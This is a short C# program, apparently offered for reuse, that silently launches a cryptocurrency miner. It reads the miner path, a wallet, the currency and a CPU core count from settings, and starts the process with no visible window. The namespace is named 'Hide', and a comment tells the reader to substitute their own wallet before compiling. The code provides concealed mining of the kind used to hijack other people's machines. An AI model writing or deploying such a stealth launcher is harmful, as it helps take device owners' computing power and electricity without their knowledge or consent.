using System;

namespace Hide
{
    static class Program
    {
        static void Main()
        {
            var settings = Properties.Settings.Default;
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = settings.pathToProcess;
            startInfo.Arguments = string.Format("-user {0} {1} {2}", settings.user, settings.currency, settings.cpuCoreCount ); //this is obviously my wallet, replace with your own
            startInfo.RedirectStandardOutput = true;                                   //before compiling
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            System.Diagnostics.Process processTemp = new System.Diagnostics.Process();
            processTemp.StartInfo = startInfo;
            processTemp.EnableRaisingEvents = true;
            try
            {
                processTemp.Start();
            }
            catch (Exception e)
            {
                throw;
            }
        }
    }
}
